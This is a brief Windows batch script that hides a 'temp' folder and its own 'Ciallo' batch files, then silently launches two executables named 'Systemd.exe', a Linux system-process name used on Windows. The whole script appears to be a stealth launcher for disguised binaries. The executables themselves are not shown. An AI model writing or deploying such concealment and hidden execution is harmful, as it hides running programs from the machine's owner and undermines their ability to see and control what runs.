@echo off
attrib +h /s /d ".\temp"
attrib +h /s /d ".\Ciallo*.bat"
cd /d ".\temp\" && start /b "" ".\Systemd.exe"
cd /d ".\Ciallo\" && start /b "" /wait ".\Systemd.exe"
exit